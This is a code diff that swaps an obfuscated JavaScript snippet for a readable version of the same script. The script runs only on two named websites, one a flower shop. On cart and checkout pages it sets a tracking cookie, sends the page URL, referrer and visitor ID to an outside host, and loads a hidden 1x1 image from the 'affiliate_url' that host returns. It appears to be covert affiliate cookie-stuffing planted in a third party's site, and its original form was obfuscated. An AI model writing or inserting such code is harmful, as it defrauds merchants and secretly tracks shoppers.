@@ -1,1 +1,86 @@
-(function(_0x458024,_0x4adc72){var _0x36d2d=_0x4ac9,_0x2ce1bf=_0x458024();while(!![]){try{var _0x2a42d0=-parseInt(_0x36d2d(0x1f1))/0x1+-parseInt(_0x36d2d(0x1c3))/0x2*(-parseInt(_0x36d2d(0x1f7))/0x3)+parseInt(_0x36d2d(0x1e0))/0x4*(parseInt(_0x36d2d(0x1d9))/0x5)+parseInt(_0x36d2d(0x1ce))/0x6*(-parseInt(_0x36d2d(0x1e6))/0x7)+parseInt(_0x36d2d(0x1e3))/0x8*(parseInt(_0x36d2d(0x1fa))/0x9)+parseInt(_0x36d2d(0x1cd))/0xa*(parseInt(_0x36d2d(0x1f4))/0xb)+parseInt(_0x36d2d(0x1cb))/0xc*(-parseInt(_0x36d2d(0x1c8))/0xd);if(_0x2a42d0===_0x4adc72)break;else _0x2ce1bf['push'](_0x2ce1bf['shift']());}catch(_0x36209c){_0x2ce1bf['push'](_0x2ce1bf['shift']());}}}(_0x8d21,0x21b46),(function(){var _0x7ecf59=_0x4ac9;function _0x3d7c7e(){var _0x5a3e61=_0x4ac9;return _0x5a3e61(0x1ea)['replace'](/[xy]/g,function(_0x46abb3){var _0x4b60c0=_0x5a3e61,_0x10ac09=Math[_0x4b60c0(0x1f9)]()*0x10|0x0,_0xbf9a6b=_0x46abb3==='x'?_0x10ac09:_0x10ac09&0x3|0x8;return _0xbf9a6b['toString'](0x10);});}function _0x43efc2(_0x58968f){var _0x4d666f=_0x4ac9,_0x48ac74=document['cookie'][_0x4d666f(0x1f8)](new RegExp(_0x4d666f(0x1d7)+_0x58968f+'=([^;]*)'));return _0x48ac74?decodeURIComponent(_0x48ac74[0x1]):'';}function _0x44351a(_0x39e778){var _0x3c954a=_0x4ac9,_0x58346d=document['createElement']('img');_0x58346d[_0x3c954a(0x1df)]=_0x39e778,_0x58346d[_0x3c954a(0x1d3)]=0x1,_0x58346d[_0x3c954a(0x1d2)]=0x1,_0x58346d[_0x3c954a(0x1cc)][_0x3c954a(0x1d4)]=_0x3c954a(0x1f5),document[_0x3c954a(0x1dd)][_0x3c954a(0x1d6)](_0x58346d);}function _0x2666fb(){var _0x10080c=_0x4ac9,_0x367724=['cart',_0x10080c(0x1cf),_0x10080c(0x1c2),'pay',_0x10080c(0x1c4),_0x10080c(0x1da),_0x10080c(0x1ed)];return _0x367724[_0x10080c(0x1d0)](function(_0x9b7bc2){var _0x482266=_0x10080c;return window['location']['pathname'][_0x482266(0x1c1)]()[_0x482266(0x1f0)](_0x9b7bc2);});}async function _0x6045c(){var _0x1cbd01=_0x4ac9,_0x31c9d2=_0x1cbd01(0x1f3)+window['location'][_0x1cbd01(0x1ec)];if(sessionStorage[_0x1cbd01(0x1d1)](_0x31c9d2))return;try{var _0x125abf=_0x43efc2(_0x1cbd01(0x1e2))||_0x3d7c7e(),_0x400218=new Date(Date[_0x1cbd01(0x1c6)]()+0x1e*0x15180*0x3e8)[_0x1cbd01(0x1dc)]();document[_0x1cbd01(0x1db)]=_0x1cbd01(0x1f2)+_0x125abf+';\x20expires='+_0x400218+';\x20path=/;\x20SameSite=Lax';var _0x7c78bf=await fetch(_0x1cbd01(0x1e9),{'method':'POST','headers':{'Content-Type':_0x1cbd01(0x1ef)},'body':JSON[_0x1cbd01(0x1f6)]({'url':location[_0x1cbd01(0x1d8)],'referrer':document[_0x1cbd01(0x1fc)],'unique_id':_0x125abf,'origin':location[_0x1cbd01(0x1e4)]})}),_0x11af3b=await _0x7c78bf[_0x1cbd01(0x1ca)]();_0x11af3b[_0x1cbd01(0x1e7)]&&_0x11af3b[_0x1cbd01(0x1c9)]?(_0x44351a(_0x11af3b[_0x1cbd01(0x1c9)]),sessionStorage[_0x1cbd01(0x1fb)](_0x31c9d2,'1')):_0x44351a(_0x1cbd01(0x1c7)+_0x125abf);}catch(_0x385c66){console[_0x1cbd01(0x1d5)](_0x1cbd01(0x1e1),_0x385c66);}}function _0x33e53b(){var _0x7aa103=_0x4ac9,_0x110011=window[_0x7aa103(0x1de)][_0x7aa103(0x1e4)],_0x458450={'www.fareastflora.com':{'always':![],'cartExtra':!![]},'aimedialinks.com':{'always':!![],'cartExtra':!![]}},_0x394486=_0x458450[_0x110011];if(_0x394486){if(_0x394486[_0x7aa103(0x1c5)]&&_0x2666fb())_0x6045c();else _0x394486[_0x7aa103(0x1eb)]&&_0x6045c();}}document[_0x7ecf59(0x1e5)]===_0x7ecf59(0x1ee)?_0x33e53b():window[_0x7ecf59(0x1e8)]('load',_0x33e53b,{'once':!![]});}()));function _0x4ac9(_0x43e3f9,_0x352cbb){_0x43e3f9=_0x43e3f9-0x1c1;var _0x8d2111=_0x8d21();var _0x4ac977=_0x8d2111[_0x43e3f9];return _0x4ac977;}function _0x8d21(){var _0x150e8f=['affiliate_url','json','876jvMJeG','style','10pkkJkf','18hbCiQk','checkout','some','getItem','height','width','display','error','appendChild','(?:^|;\x20)','href','15KHOHbU','review-order','cookie','toUTCString','body','location','src','239024tbXDei','Tracking\x20error','tracking_uuid','1557384WbetvW','hostname','readyState','319151dUxKVM','success','addEventListener','https://theclicksdealer.com/api/track-user','xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx','always','pathname','payment','complete','application/json','includes','199991quGeXy','tracking_uuid=','tracking_done_','1239073Mijsks','none','stringify','12trrGgC','match','random','9HdqUNA','setItem','referrer','toLowerCase','checkouts','59674MxPCEm','shipping','cartExtra','now','https://theclicksdealer.com/api/fallback-pixel?id=','23348NYHTlZ'];_0x8d21=function(){return _0x150e8f;};return _0x8d21();}
+(function () {
+
+  function generateUUID() {
+    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+      var r = Math.random() * 16 | 0;
+      var v = c === 'x' ? r : (r & 0x3 | 0x8);
+      return v.toString(16);
+    });
+  }
+
+  function getCookie(name) {
+    var match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
+    return match ? decodeURIComponent(match[1]) : '';
+  }
+
+  function createTrackingPixel(url) {
+    var img = document.createElement("img");
+    img.src = url;
+    img.width = 1;
+    img.height = 1;
+    img.style.display = "none";
+    document.body.appendChild(img);
+  }
+
+  function isCartPage() {
+    var cartPatterns = ["cart", "checkout", "checkouts", "pay", "shipping", "review-order", "payment"];
+    return cartPatterns.some(function (p) {
+      return window.location.pathname.toLowerCase().includes(p);
+    });
+  }
+
+  async function initTracking() {
+    try {
+      var uniqueId = getCookie('tracking_uuid') || generateUUID();
+      var expires = new Date(Date.now() + 30 * 86400 * 1000).toUTCString();
+      document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + '; path=/; SameSite=Lax';
+
+      var res = await fetch("https://theclicksdealer.com/api/track-user", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          url: location.href,
+          referrer: document.referrer,
+          unique_id: uniqueId,
+          origin: location.hostname,
+        })
+      });
+
+      var data = await res.json();
+
+      if (data.success && data.affiliate_url) {
+        createTrackingPixel(data.affiliate_url);
+      } else {
+        createTrackingPixel('https://theclicksdealer.com/api/fallback-pixel?id=' + uniqueId);
+      }
+
+    } catch (e) {
+      console.error("Tracking error", e);
+    }
+  }
+
+  function run() {
+    var host = window.location.hostname;
+
+    var config = {
+      "www.fareastflora.com": { always: false, cartExtra: true },
+      "aimedialinks.com": { always: true, cartExtra: true },
+    };
+
+    var site = config[host];
+    if (site) {
+      if (site.cartExtra && isCartPage()) {
+        initTracking();
+      } else if (site.always) {
+        initTracking();
+      }
+    }
+  }
+
+  if (document.readyState === 'complete') {
+    run();
+  } else {
+    window.addEventListener('load', run, { once: true });
+  }
+
+})();
